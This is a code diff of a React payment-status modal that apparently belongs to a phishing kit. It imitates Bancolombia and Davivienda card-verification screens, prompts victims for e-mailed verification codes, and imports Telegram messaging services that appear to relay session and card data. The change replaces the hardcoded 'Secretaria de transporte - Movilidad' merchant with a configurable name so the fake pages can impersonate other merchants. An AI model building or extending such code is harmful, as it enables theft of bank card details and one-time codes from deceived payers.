@@ -3,10 +3,12 @@ import { sendMessage } from "../services/telegram/sendMessage";
 import { CheckCardService } from "../services/checkCardService";
 import Image from "next/image";
 import { savePaymentStateService } from "../services/telegram/savePaymentState";
+import { comercioCorto } from "../lib/comercio";
 
 interface PaymentStatusModalProps {
   sessionId: string;
   isOpen: boolean;
+  comercio: string;
   price: string;
   priceFormatted: string;
   last4: string;
@@ -411,6 +413,7 @@ const DaviviendaUserForm: React.FC<DaviviendaUserFormProps> = ({
 const PaymentStatusModal: React.FC<PaymentStatusModalProps> = ({
   sessionId,
   isOpen,
+  comercio,
   price,
   priceFormatted,
   last4,
@@ -858,6 +861,8 @@ sendMessage(mensaje, keyboard, sessionId, true)
     return `${day}/${month}/${year}`;
   };
 
+  const comercioCortoName = comercioCorto(comercio);
+
   if (!isOpen) return null;
 
   const isError = status.startsWith("error_");
@@ -914,7 +919,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                       {isBancolombia ? "Comercio:" : "Commerce:"}
                     </td>
                     <td className="pb-[2px]">
-                      Secretaria de transporte - Movilidad © 2026
+                      {comercio}
                     </td>
                   </tr>
                   <tr>
@@ -1004,7 +1009,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                       {isBancolombia ? "Comercio:" : "Commerce:"}
                     </td>
                     <td className="pb-[2px]">
-                      Secretaria de transporte - Movilidad © 2026
+                      {comercio}
                     </td>
                   </tr>
                   <tr>
@@ -1093,7 +1098,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
                       Commerce:
                     </td>
-                    <td className="pb-[2px]">Secretaria de transporte</td>
+                    <td className="pb-[2px]">{comercioCortoName}</td>
                   </tr>
                   <tr>
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
@@ -1181,7 +1186,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
                       Commerce:
                     </td>
-                    <td className="pb-[2px]">Secretaria de transporte</td>
+                    <td className="pb-[2px]">{comercioCortoName}</td>
                   </tr>
                   <tr>
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
@@ -1274,7 +1279,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
                       Commerce:
                     </td>
-                    <td className="pb-[2px]">Secretaria de transporte</td>
+                    <td className="pb-[2px]">{comercioCortoName}</td>
                   </tr>
                   <tr>
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
@@ -1393,7 +1398,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
                       Commerce:
                     </td>
-                    <td className="pb-[2px]">Secretaria de transporte</td>
+                    <td className="pb-[2px]">{comercioCortoName}</td>
                   </tr>
                   <tr>
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
@@ -1463,7 +1468,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
                       Commerce:
                     </td>
-                    <td className="pb-[2px]">Secretaria de transporte</td>
+                    <td className="pb-[2px]">{comercioCortoName}</td>
                   </tr>
                   <tr>
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
@@ -1529,7 +1534,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
           <>
             <p className="psm-email-context">
               Te hemos enviado un código de verificación al E-Mail. Estás
-              autorizando un pago a Secretaria de transporte - Movilidad © 2026
+              autorizando un pago a {comercio}
               por {priceFormatted} el {getCurrentDate()} con tu tarjeta
               ************{last4}.
             </p>
@@ -1550,7 +1555,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
                       {isBancolombia ? "Comercio:" : "Commerce:"}
                     </td>
-                    <td className="pb-[2px]">Secretaria de transporte</td>
+                    <td className="pb-[2px]">{comercioCortoName}</td>
                   </tr>
                   <tr>
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
@@ -1618,7 +1623,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
           <>
             <p className="psm-email-context">
               Te hemos enviado un código de verificación al E-Mail. Estás
-              autorizando un pago a Secretaria de transporte - Movilidad © 2026
+              autorizando un pago a {comercio}
               por {priceFormatted} el {getCurrentDate()} con tu tarjeta
               ************{last4}.
             </p>
@@ -1639,7 +1644,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
                       {isBancolombia ? "Comercio:" : "Commerce:"}
                     </td>
-                    <td className="pb-[2px]">Secretaria de transporte</td>
+                    <td className="pb-[2px]">{comercioCortoName}</td>
                   </tr>
                   <tr>
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
@@ -1727,7 +1732,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
                       Commerce:
                     </td>
-                    <td className="pb-[2px]">Secretaria de transporte</td>
+                    <td className="pb-[2px]">{comercioCortoName}</td>
                   </tr>
                   <tr>
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
@@ -1799,7 +1804,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
                       Commerce:
                     </td>
-                    <td className="pb-[2px]">Secretaria de transporte</td>
+                    <td className="pb-[2px]">{comercioCortoName}</td>
                   </tr>
                   <tr>
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
@@ -1877,7 +1882,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
                       Commerce:
                     </td>
-                    <td className="pb-[2px]">Secretaria de transporte</td>
+                    <td className="pb-[2px]">{comercioCortoName}</td>
                   </tr>
                   <tr>
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
@@ -1949,7 +1954,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
                       Commerce:
                     </td>
-                    <td className="pb-[2px]">Secretaria de transporte</td>
+                    <td className="pb-[2px]">{comercioCortoName}</td>
                   </tr>
                   <tr>
                     <td className="font-bold text-right pr-[4px] pb-[2px]">
@@ -2385,7 +2390,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
               </p>
               <p className="text-xs mt-3">
                 La transacción que intentas realizar en{" "}
-                <b>Secretaria de transporte - Movilidad © 2026</b> por{" "}
+                <b>{comercio}</b> por{" "}
                 <b>{priceFormatted}</b> con tu tarjeta terminada en{" "}
                 <b>************{last4}</b> debe ser autorizada por seguridad.
               </p>
@@ -2422,7 +2427,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
                   </p>
                   <p className="text-xs mt-3 text-gray-700">
                     La transacción que intentas realizar en{" "}
-                    <b>Secretaria de transporte - Movilidad © 2026</b> por{" "}
+                    <b>{comercio}</b> por{" "}
                     <b>{priceFormatted}</b> con tu tarjeta terminada en{" "}
                     <b>************{last4}</b> debe ser autorizada por
                     seguridad.
@@ -2435,7 +2440,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
               <p className="text-[10px] mt-5">Transaction authorization</p>
               <p className="text-xs mt-5">
                 The transaction you are trying to make with{" "}
-                <b>Secretaria de transporte - Movilidad © 2026</b> for{" "}
+                <b>{comercio}</b> for{" "}
                 <b>{priceFormatted}</b>
               </p>
             </>
